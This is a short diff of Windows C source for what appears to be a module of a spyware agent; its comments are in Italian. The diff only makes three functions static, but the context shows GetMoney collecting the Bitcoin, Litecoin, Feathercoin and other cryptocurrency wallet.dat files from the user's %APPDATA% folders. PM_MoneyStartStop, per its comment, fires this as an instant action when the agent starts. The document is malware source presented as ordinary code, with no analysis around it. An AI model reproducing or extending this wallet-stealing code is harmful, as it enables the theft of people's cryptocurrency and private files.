@@ -64,7 +64,7 @@ static void GetCurrency(const WCHAR *currency_path, DWORD type)
 	CloseHandle(hsrc);
 }
 
-void GetMoney()
+static void GetMoney()
 {
 	GetCurrency(L"%APPDATA%\\Bitcoin\\wallet.dat", MONEY_BITCOIN);
 	GetCurrency(L"%APPDATA%\\Litecoin\\wallet.dat", MONEY_LITECOIN);
@@ -72,7 +72,7 @@ void GetMoney()
 	GetCurrency(L"%APPDATA%\\Feathercoin\\wallet.dat", MONEY_NAMECOIN);
 }
 
-DWORD WINAPI PM_MoneyStartStop(BOOL bStartFlag, BOOL bReset)
+static DWORD WINAPI PM_MoneyStartStop(BOOL bStartFlag, BOOL bReset)
 {
 	// Questo agente non ha stato started/stopped, ma quando
 	// viene avviato esegue un'azione istantanea.
@@ -82,7 +82,7 @@ DWORD WINAPI PM_MoneyStartStop(BOOL bStartFlag, BOOL bReset)
 	return 1;
 }
 
-DWORD WINAPI PM_MoneyInit(cJSON* elem)
+static DWORD WINAPI PM_MoneyInit(cJSON* elem)
 {
 	return 1;
 }
